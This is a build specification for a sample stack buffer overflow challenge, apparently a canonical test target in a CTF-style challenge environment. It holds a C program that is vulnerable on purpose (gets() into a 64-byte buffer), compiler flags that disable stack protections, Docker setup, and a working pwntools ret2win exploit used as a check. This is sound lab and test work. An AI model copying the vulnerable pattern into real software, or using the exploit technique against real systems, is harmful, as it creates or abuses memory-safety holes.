# Step 02 — Sample Challenge (example-bof)

**Reference docs:** `docs/challenge-env.md`

**Docker required:** Yes — this step builds and runs the challenge container.

---

## What to Build

A minimal stack buffer overflow challenge used as the canonical test target throughout all integration tests. It must be exploitable with a simple ret2win pattern (no ASLR, no stack canary, no PIE).

---

## Files to Create

### `challenges/example-bof/vuln.c`

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void win() {
    char flag[64];
    FILE *f = fopen("/challenge/flag", "r");
    if (f == NULL) {
        puts("Flag file not found.");
        exit(1);
    }
    fgets(flag, sizeof(flag), f);
    fclose(f);
    puts(flag);
    fflush(stdout);
}

void vuln() {
    char buf[64];
    printf("Enter input: ");
    fflush(stdout);
    gets(buf);
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin,  NULL, _IONBF, 0);
    vuln();
    return 0;
}
```

### `challenges/example-bof/flag`

```
CTF{example_bof_flag_for_testing}
```

### `challenges/example-bof/Makefile`

```makefile
CC = gcc
CFLAGS = -m64 -fno-stack-protector -no-pie -z execstack -w

all: pwn_binary

pwn_binary: vuln.c
	$(CC) $(CFLAGS) -o pwn_binary vuln.c

clean:
	rm -f pwn_binary
```

### Compile the binary

```bash
cd challenges/example-bof
make
```

Verify the binary has the required properties:
```bash
checksec --file=pwn_binary
# Should show: No RELRO / No canary / NX disabled / No PIE
```

If `checksec` is not installed: `pip install checksec-py` or use `readelf -l pwn_binary`.

### `challenges/example-bof/Dockerfile`

```dockerfile
FROM challenge-base:22.04

COPY pwn_binary  /challenge/pwn_binary
COPY flag        /challenge/flag

RUN chmod +x /challenge/pwn_binary

ENV CHALLENGE_PORT=4444
ENV CHALLENGE_BINARY=/challenge/pwn_binary

EXPOSE 4444 5000
```

---

## Build and Run Verification

### 1. Build the challenge-base:22.04 image
```bash
docker build -f challenge-base/Dockerfile.22.04 \
    -t challenge-base:22.04 \
    challenge-base/
```

### 2. Build the example-bof image
```bash
docker build -t challenge-env:example-bof challenges/example-bof/
```

### 3. Run the challenge container (standalone test, no PID sharing yet)
```bash
docker run -d --rm \
    --name test-challenge \
    -p 4444:4444 \
    -p 5000:5000 \
    challenge-env:example-bof
```

### 4. Verify xinetd is serving the binary
```bash
python3 -c "
from pwn import *
conn = remote('localhost', 4444)
conn.recvuntil(b'Enter input: ')
print('Connection OK')
conn.close()
"
```

### 5. Verify the binary is exploitable (find win() address and exploit)
```python
# Run this Python snippet manually
from pwn import *

context.arch = 'amd64'
context.log_level = 'error'

binary = ELF('challenges/example-bof/pwn_binary')
win_addr = binary.symbols['win']
print(f"win() at: {hex(win_addr)}")

# Exploit
conn = remote('localhost', 4444)
conn.recvuntil(b'Enter input: ')
payload = b'A' * 72 + p64(win_addr)   # 64-byte buf + 8-byte saved RBP
conn.sendline(payload)
output = conn.recvall(timeout=2)
print(f"Output: {output}")
assert b'CTF{' in output, "Exploit failed!"
print("Exploit OK")
conn.close()
```

If the offset is wrong, use `cyclic` to find it:
```python
from pwn import *
conn = remote('localhost', 4444)
conn.recvuntil(b'Enter input: ')
conn.sendline(cyclic(200))
conn.close()
# Run in GDB to find RSP value, then:
# cyclic_find(0x<rsp_value>)  ← gives the offset
```

### 6. Verify flag verifier endpoint
```bash
curl -s -X POST http://localhost:5000/verify \
    -H "Content-Type: application/json" \
    -d '{"flag": "CTF{example_bof_flag_for_testing}"}' \
    | python3 -m json.tool
# Expected: {"correct": true}

curl -s -X POST http://localhost:5000/verify \
    -H "Content-Type: application/json" \
    -d '{"flag": "wrong"}' \
    | python3 -m json.tool
# Expected: {"correct": false}

curl -s http://localhost:5000/verify
# Expected: 404 or Method Not Allowed
```

### 7. Stop the test container
```bash
docker stop test-challenge
```

All checks must pass. Note the exact `win()` address and exploit offset for use in Step 14.

---

## Record These Values

After verification, record the following for use in the integration test (Step 14):

```
win() address:  0x__________
exploit offset: __________  (bytes of padding before return address)
```

Add these as comments in `challenges/example-bof/vuln.c`.
